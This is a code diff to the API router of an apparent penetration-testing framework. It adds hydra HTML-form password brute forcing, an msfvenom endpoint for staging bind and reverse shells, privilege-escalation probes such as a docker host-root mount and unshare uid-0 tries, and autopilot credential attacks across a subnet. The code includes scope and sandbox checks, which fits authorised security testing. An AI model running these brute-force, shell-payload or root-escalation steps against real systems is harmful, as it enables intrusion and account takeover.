@@ -9,11 +9,11 @@ import uuid
 from collections.abc import AsyncIterator
 from contextlib import suppress
 from datetime import UTC, datetime
-from pathlib import Path
 from typing import Any
 
 from fastapi import APIRouter, BackgroundTasks, HTTPException
 from fastapi.responses import StreamingResponse
+from paths import data_dir
 from schemas import (
     ADBloodhoundRequest,
     ADMitm6Request,
@@ -68,11 +68,9 @@ _passattack_jobs: dict[str, dict[str, Any]] = {}
 _attack_cache: dict[str, list[dict[str, Any]]] = {}
 
 # Runtime store lives next to the bundled data on a host checkout, in
-# /opt/h4k/data in the container image. Whatever path resolves first and is
-# writable wins — tests must not require the container layout.
-_CONTAINER_DATA = Path("/opt/h4k/data")
-_REPO_DATA = Path(__file__).resolve().parent.parent / "data"
-_RUNTIME_DATA = _CONTAINER_DATA if _CONTAINER_DATA.is_dir() else _REPO_DATA
+# /opt/h4k/data in the container image. The resolution lives in paths.py so
+# the API, the engagement store and the tests always agree.
+_RUNTIME_DATA = data_dir()
 _NEIGHBOR_DB = _RUNTIME_DATA / "neighbors.db"
 _NEIGHBOR_DB.parent.mkdir(parents=True, exist_ok=True)
 
@@ -1423,6 +1421,7 @@ def _run_fingerprint(job: dict[str, Any], neighbors: list[dict[str, Any]]) -> No
             argv = [
                 "nmap",
                 "-sS",
+                "-sV",
                 "-T4",
                 "-Pn",
                 "-p",
@@ -1430,12 +1429,12 @@ def _run_fingerprint(job: dict[str, Any], neighbors: list[dict[str, Any]]) -> No
                 "--max-retries",
                 "1",
                 "--host-timeout",
-                "8s",
+                "30s",
                 "-oX",
                 "-",
                 ip,
             ]
-            result = runner.run_tool("nmap", argv, timeout=15)
+            result = runner.run_tool("nmap", argv, timeout=150)
             parsed = (
                 _parse_nmap_xml(result["stdout"]) if result["status"] == "ok" else []
             )
@@ -1638,6 +1637,11 @@ PASSATTACK_SERVICES: dict[str, dict[str, Any]] = {
     "telnet": {"hydra": "telnet", "default_port": 23},
     "mysql": {"hydra": "mysql", "default_port": 3306},
     "http-basic": {"hydra": "http-get", "default_port": 80, "path": "/"},
+    # HTML form login (hydra http-post-form). Needs an explicit form spec:
+    # {path, user_field, pass_field, fail} where `fail` is a response marker
+    # that is present ONLY on a failed login (e.g. 'name="username"').
+    # The operator must supply it — guessing it would fabricate results.
+    "http-form": {"hydra": "http-post-form", "default_port": 80},
 }
 
 
@@ -1649,7 +1653,14 @@ def pass_attack(req: dict[str, Any], background: BackgroundTasks) -> dict[str, A
     if not host or service not in PASSATTACK_SERVICES:
         raise HTTPException(
             status_code=422,
-            detail="host + service required (ssh/ftp/telnet/mysql/http-basic)",
+            detail="host + service required (ssh/ftp/telnet/mysql/http-basic/http-form)",
+        )
+    form = req.get("form") or {}
+    if service == "http-form" and not str(form.get("fail") or ""):
+        raise HTTPException(
+            status_code=422,
+            detail="http-form needs form:{path?, user_field?, pass_field?, fail} — "
+            "fail is a response marker present ONLY on a failed login",
         )
     _demand_scope(host)
     msf = _get_msf()
@@ -1680,6 +1691,7 @@ def pass_attack(req: dict[str, Any], background: BackgroundTasks) -> dict[str, A
         job["port"],
         req.get("users"),
         req.get("passwords"),
+        req.get("form") if service == "http-form" else None,
     )
     return {"job_id": job_id, "status": "running"}
 
@@ -1691,6 +1703,7 @@ def _run_pass_attack(
     port: int,
     users: list[str] | None = None,
     passwords: list[str] | None = None,
+    form: dict[str, Any] | None = None,
 ) -> None:
     logger.info("[passattack %s] %s:%s/%s launched", job["id"], host, port, service)
     import re as _re
@@ -1723,6 +1736,9 @@ def _run_pass_attack(
     n_users, n_pass = _count(userlist), _count(passlist)
     job["attempts"] = n_users * n_pass
 
+    # no "-o -": hydra treats that as a *file* named "-" and litters the
+    # working directory. Without it, hydra prints the hits to stdout, which is
+    # what we parse below.
     argv = [
         "hydra",
         "-L",
@@ -1732,13 +1748,23 @@ def _run_pass_attack(
         "-t",
         "6",
         "-f",
-        "-o",
-        "-",
-    ] + (
-        [f"http-get://{host}:{port}{cfg.get('path', '/')}"]
-        if service == "http-basic"
-        else [host, cfg["hydra"]]
-    )
+    ]
+    if service == "http-form":
+        form = form or {}
+        path = str(form.get("path", "/index.php"))
+        user_field = str(form.get("user_field", "username"))
+        pass_field = str(form.get("pass_field", "password"))
+        fail = str(form.get("fail", ""))
+        if not fail:  # endpoint validates first; this is the backstop
+            job["error"] = "http-form needs form.fail"
+            _update(job, status="error", progress=100.0, message="no fail marker")
+            return
+        spec = f"{path}:{user_field}=^USER^&{pass_field}=^PASS^:{fail}"
+        argv += ["-s", str(port), host, "http-post-form", spec]
+    elif service == "http-basic":
+        argv += [f"http-get://{host}:{port}{cfg.get('path', '/')}"]
+    else:
+        argv += [host, cfg["hydra"]]
 
     def _logline(msg: str) -> None:
         job["log"].append(msg)
@@ -2032,7 +2058,13 @@ def get_graph() -> dict[str, Any]:
     services = msf.services(workspace)
 
     eng_id, eng_store = _active_scope()
-    out_of_scope_probe = eng_store.in_scope if (eng_id and eng_store) else None
+    # `in_scope` takes (engagement_id, host) -- bind the engagement here so the
+    # probe below can be called with just a host.
+    out_of_scope_probe = (
+        (lambda host: eng_store.in_scope(eng_id, host))
+        if (eng_id and eng_store)
+        else None
+    )
 
     vuln_count_by_host: dict[str, int] = {}
     for v in _load_neighbor_vulns():
@@ -2378,7 +2410,14 @@ def list_sessions() -> dict[str, Any]:
     finally:
         conn.close()
     known = {s["msf_session_id"] for s in live}
-    merged = live + [r for r in recorded if r["msf_session_id"] not in known]
+    for s in live:
+        s["alive"] = True
+    # Recorded sessions outlive msfrpcd restarts and dead handlers: keep them
+    # as history, but never present a dead one as usable. The operator re-enters
+    # via propagation or a fresh exploit (see the Persist phase).
+    merged = live + [
+        {**r, "alive": False} for r in recorded if r["msf_session_id"] not in known
+    ]
     return {"sessions": merged, "count": len(merged)}
 
 
@@ -2429,6 +2468,51 @@ def session_cmd(msf_session_id: str, req: dict[str, Any]) -> dict[str, Any]:
 
 
 _toolkit_jobs: dict[str, dict[str, Any]] = {}
+
+
+@router.post("/payload")
+def generate_payload(req: dict[str, Any]) -> dict[str, Any]:
+    """OPT-IN helper: render an msfvenom payload offline (no target touched).
+
+    Used to stage bind/reverse shells for manual triggers
+    (e.g. {"payload": "php/bind_php", "options": {"LPORT": 4445}}).
+    Generation is local; *using* the payload is the aggressive step.
+    """
+    import re as _re
+
+    from services.toolkit import ToolkitRunner
+
+    payload = str(req.get("payload") or "").strip()
+    if not _re.fullmatch(r"[A-Za-z0-9_/\-]+", payload):
+        raise HTTPException(
+            status_code=422, detail="payload required (e.g. php/bind_php)"
+        )
+    fmt = str(req.get("format") or "raw")
+    if not _re.fullmatch(r"[A-Za-z0-9]+", fmt):
+        raise HTTPException(status_code=422, detail="bad format")
+    options = req.get("options") or {}
+    if not isinstance(options, dict):
+        raise HTTPException(status_code=422, detail="options must be an object")
+    argv = ["msfvenom", "-p", payload]
+    for key, val in options.items():
+        if not _re.fullmatch(r"[A-Za-z0-9_]+", str(key)) or not _re.fullmatch(
+            r"[\w.\-]+", str(val)
+        ):
+            raise HTTPException(status_code=422, detail=f"bad option {key!r}")
+        argv += [f"{key}={val}"]
+    argv += ["-f", fmt]
+    runner = ToolkitRunner()
+    result = runner.run_tool("msfvenom", argv, timeout=120)
+    out = result["stdout"] + result["stderr"]
+    return {
+        "payload": payload,
+        "format": fmt,
+        "options": {k: str(v) for k, v in options.items()},
+        "stdout": out[:20000],
+        "rc": result["rc"],
+        "timed_out": result["timed_out"],
+        "status": result["status"],
+    }
 
 
 @router.post("/deepattack")
@@ -2684,7 +2768,64 @@ def container_escape_check() -> ContainerEscapeResult:
     """Detect container escape vectors (read-only; never auto-executes)."""
     from services.container_escape import ContainerEscape
 
-    return ContainerEscapeResult(**ContainerEscape().detect())
+    result = ContainerEscape().detect()
+    # h4k is also aware of the host-side docker-group-to-root path
+    # (labs/docker-group-to-root/): surface it alongside the in-container
+    # vectors so the operator sees the full privilege surface in one place.
+    try:
+        from services.privesc import docker_group_report
+
+        priv = docker_group_report()
+        for vec in priv.get("vectors", []):
+            if vec not in result["vectors"]:
+                result["vectors"].append(vec)
+    except Exception:
+        pass
+    return ContainerEscapeResult(**result)
+
+
+@router.get("/privesc")
+def privesc_check() -> dict[str, Any]:
+    """Read-only privilege-surface report (docker-group-to-root awareness)."""
+    from services.privesc import docker_group_report
+
+    return docker_group_report()
+
+
+@router.post("/privesc/try-docker-group")
+def privesc_try() -> dict[str, Any]:
+    """OPT-IN safe try: prove host-root read via a read-only mount.
+
+    Runs `docker run --rm -v /:/host:ro` + `ls /host/root` only — never
+    writes, never execs on the host. Disabled in sandbox mode.
+    """
+    from services.privesc import try_docker_group_read
+
+    return try_docker_group_read()
+
+
+@router.post("/privesc/try-userns")
+def privesc_try_userns() -> dict[str, Any]:
+    """OPT-IN safe try: prove uid 0 via unshare userns (no sudo, no docker).
+
+    Runs `unshare -Urm id` only. Creates nothing, touches no daemon.
+    Disabled in sandbox mode. Note: namespace root, not host root.
+    """
+    from services.privesc import try_userns_root
+
+    return try_userns_root()
+
+
+@router.get("/privesc/host-audit")
+def privesc_host_audit() -> dict[str, Any]:
+    """Read-only host privesc audit: SUID, file caps, writable sensitive.
+
+    Uses no sudo and never touches docker. Returns either a concrete
+    host-root vector or an explicit no-vector verdict for the scope.
+    """
+    from services.privesc import host_privesc_audit
+
+    return host_privesc_audit()
 
 
 @router.post("/nuclei", response_model=NucleiResult)
@@ -2875,6 +3016,119 @@ def ollama_listener_get(lhost: str = "0.0.0.0", lport: int = 4444) -> dict[str, 
 
     threading.Thread(target=_listen, daemon=True).start()
     return result
+
+
+@router.get("/capabilities")
+def capabilities() -> dict[str, Any]:
+    """What this instance can actually do right now.
+
+    Tool availability, Metasploit reachability and database state, the data
+    directory, and the warnings for anything that would silently fail (a
+    Metasploit without a database is the classic one: scans come back empty).
+    """
+    from services.capabilities import build_report
+
+    return build_report(_get_msf())
+
+
+@router.get("/map")
+def passive_map() -> dict[str, Any]:
+    """The live passive network/service map built by auto-scan.
+
+    Returns the current map (hosts, services, vulns) plus the auto-scan
+    status. The map is also available through the active engagement's asset
+    graph, so a single source of truth is kept.
+    """
+    from services import auto_scan as auto_scan_module
+    from services.engagement import EngagementStore
+
+    status = auto_scan_module.status()
+    eng_id = status.get("engagement_id")
+    hosts: list[dict[str, Any]] = []
+    if eng_id:
+        try:
+            store = EngagementStore()
+            if store.get_engagement(eng_id):
+                hosts = store.assets(eng_id)
+        except Exception as exc:
+            logger.debug("map: could not read engagement: %s", exc)
+    return {
+        "status": status,
+        "hosts": hosts,
+        "host_count": len(hosts),
+        "service_count": sum(len(h.get("services") or []) for h in hosts),
+        "vuln_count": sum(len(h.get("vulns") or []) for h in hosts),
+    }
+
+
+@router.post("/map/start")
+def passive_map_start() -> dict[str, Any]:
+    from services import auto_scan as auto_scan_module
+
+    auto_scan_module.start(force=True)
+    return auto_scan_module.status()
+
+
+@router.post("/map/stop")
+def passive_map_stop() -> dict[str, Any]:
+    from services import auto_scan as auto_scan_module
+
+    auto_scan_module.stop()
+    return auto_scan_module.status()
+
+
+@router.post("/tryLocalRoot_go_bro")
+def try_local_root_go_bro() -> dict[str, Any]:
+    """One-shot local-root assessment: try every passwordless path, audit rest.
+
+    Runs, in order: the userns uid-0 try (no sudo, no docker), the
+    docker-group read-only try, and the full host audit (SUID, file caps +
+    live probe, credential gates, systemd/PATH/polkit, CVE posture). Nothing
+    here supplies a password, writes a file, or executes a container
+    payload — the tries are `id`/`ls` only. Sandbox-gated like the
+    individual try endpoints.
+    """
+    from services.privesc import (
+        docker_group_report,
+        host_privesc_audit,
+        try_docker_group_read,
+        try_userns_root,
+    )
+
+    userns = try_userns_root()
+    docker_group = try_docker_group_read()
+    audit = host_privesc_audit()
+    try:
+        privilege = docker_group_report()
+    except Exception:
+        privilege = {"vectors": [], "at_risk": False}
+    if userns.get("success"):
+        verdict = "namespace uid 0 achieved (no sudo, no docker); " + (
+            "HOST-ROOT VECTOR PRESENT: " + audit.get("verdict", "")[:200]
+            if audit.get("host_root_vector_found")
+            else "no host uid-0/DAC-bypass vector in automated scope"
+        )
+    else:
+        verdict = "userns try did not yield uid 0 here; " + audit.get(
+            "verdict", "no audit verdict"
+        )
+    return {
+        "feature": "tryLocalRoot_go_bro",
+        "userns": userns,
+        "docker_group": docker_group,
+        "host_audit": audit,
+        "privilege": privilege,
+        "verdict": verdict,
+        "host_root_achieved": bool(audit.get("host_root_vector_found")),
+        "uses_password": False,
+    }
+
+
+@router.get("/map/status")
+def passive_map_status() -> dict[str, Any]:
+    from services import auto_scan as auto_scan_module
+
+    return auto_scan_module.status()
 
 
 @router.get("/health")
@@ -3091,7 +3345,9 @@ def _run_autopilot(
     from services.discovery import NeighborFinder
 
     finder = NeighborFinder(msf)
-    default_cidr = "192.168.1.0/24"
+    from services.sandbox import enabled as sandbox_enabled, sandbox_scope
+
+    default_cidr = sandbox_scope() if sandbox_enabled() else "192.168.1.0/24"
     found_ips: list[str] = []
     try:
         found = finder.discover(default_cidr)
@@ -3149,6 +3405,7 @@ def _run_autopilot(
         ]
         result = runner.run_tool("nmap", argv, timeout=15)
         parsed = _parse_nmap_xml(result["stdout"]) if result["status"] == "ok" else []
+        entry = {}
         for entry in parsed:
             open_svcs = [
                 s for s in entry.get("services", []) if s.get("state") == "open"
@@ -3261,7 +3518,10 @@ def _run_autopilot(
         _ap_note_host(job, ip, stage="passwords")
         userlist = str(_RUNTIME_DATA / "users.txt")
         passlist = str(_RUNTIME_DATA / "passwords.txt")
-        argv = ["hydra", "-L", userlist, "-P", passlist, "-t", "6", "-f", "-o", "-"]
+        # no "-o -": hydra treats that as a *file* named "-" and litters the
+        # working directory. Without it, hydra prints hits to stdout, which is
+        # what we parse.
+        argv = ["hydra", "-L", userlist, "-P", passlist, "-t", "6", "-f"]
         if family == "http-basic":
             argv.append(f"http-get://{ip}:{port}/")
         else:
